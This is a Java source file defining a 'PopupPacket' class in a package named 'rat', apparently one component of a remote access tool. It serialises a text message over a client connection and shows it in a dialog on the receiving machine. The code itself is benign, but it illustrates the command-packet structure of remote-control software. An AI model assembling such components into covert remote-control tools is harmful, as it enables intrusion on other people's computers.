package de.sogomn.rat;

import javax.swing.JOptionPane;



public final class PopupPacket implements IPacket {
	
	private String message;
	
	public PopupPacket(final String message) {
		this.message = message;
	}
	
	public PopupPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(message);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		message = client.readUTF();
	}
	
	@Override
	public void execute() {
		JOptionPane.showMessageDialog(null, message);
	}
	
	public String getMessage() {
		return message;
	}
	
}
